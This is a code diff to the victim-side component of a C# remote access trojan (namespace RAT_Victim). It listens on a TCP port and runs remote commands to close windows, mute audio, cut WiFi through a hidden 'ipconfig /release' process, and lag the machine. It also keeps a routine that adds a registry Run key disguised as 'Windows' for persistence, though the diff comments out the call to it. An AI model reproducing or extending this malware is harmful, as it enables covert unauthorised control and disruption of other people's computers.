@@ -1,7 +1,6 @@
 ﻿using Microsoft.Win32;
 using RAT_Library;
 using System;
-using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -15,12 +14,14 @@ namespace RAT_Victim
 
         private static void Main()
         {
-            AddToStartup();
+            //AddToStartup();
             StartServer();
         }
 
         private static void StartServer()
         {
+            Console.WriteLine("Starting server");
+
             var server = new Socket(SocketType.Stream, ProtocolType.Tcp);
             server.Bind(new IPEndPoint(IPAddress.Any, Common.Port));
             server.Listen(0);
@@ -31,6 +32,7 @@ namespace RAT_Victim
                 var buffer = new byte[Common.BufferSize];
                 var byteCount = Client.Receive(buffer);
                 var command = (RatCommand)buffer[0];
+
                 switch (command)
                 {
                     case RatCommand.CloseActiveWindow:
@@ -58,12 +60,10 @@ namespace RAT_Victim
                         WinApi.keybd_event(Keys.VolumeMute, 0, 0, 0);
                         break;
                     case RatCommand.DisableWiFi:
-                        var process = new Process();
-                        var info = process.StartInfo;
-                        info.FileName = "ipconfig";
-                        info.Arguments = "/release";
-                        info.WindowStyle = ProcessWindowStyle.Hidden;
-                        process.Start();
+                        Commands.DisableWiFi();
+                        break;
+                    case RatCommand.Lag:
+                        Commands.Lag();
                         break;
                     default:
                         throw new ArgumentOutOfRangeException();
@@ -73,6 +73,8 @@ namespace RAT_Victim
 
         private static void AddToStartup()
         {
+            Console.WriteLine("Adding to startup");
+
             var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             const string appName = "Windows";
             if (subKey.GetValue(appName) == null)
